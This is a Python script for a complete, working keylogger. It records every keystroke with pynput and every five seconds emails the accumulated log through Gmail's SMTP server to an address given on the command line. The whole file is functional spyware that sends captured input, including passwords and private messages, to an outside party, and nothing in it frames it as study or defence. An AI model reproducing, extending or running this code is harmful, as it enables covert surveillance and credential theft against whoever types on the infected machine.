#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib
import argparse
import sys

class Keylogger:
    def __init__(self, time_interval,email, email_to, password):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.email_to = email_to
        self.password = password

    def process_key_press(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log+" "
            else:
                self.log= self.log+" "+str(key)+" "


    def report(self):
        try:
            self.send_mail(self.email, self.email_to, self.password, "\n\n"+ self.log)
        except Exception:
            print("[-] Google is preventing form login due to security reason.")
            print("[-] Change google security setting Or visit  https://support.google.com/mail/?p=badcredentials for detailed help.")
            sys.exit()
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self ,email, email_to, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email_to, message)
        server.quit()


    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--s_email", dest="email", help="Sender email")
parser.add_argument("-p", "--password", dest="password", help="Sender email password")
parser.add_argument("-r", "--r_email", dest="email_to", help="Receiver email")
option = parser.parse_args()
email = option.email
password = option.password
email_to = option.email_to

if email==None or password==None or email_to==None:
    print("[-] All credientials are not provided. For help use -h.")
    sys.exit()

my_keyloger = Keylogger(5,email,email_to,password)
my_keyloger.start()
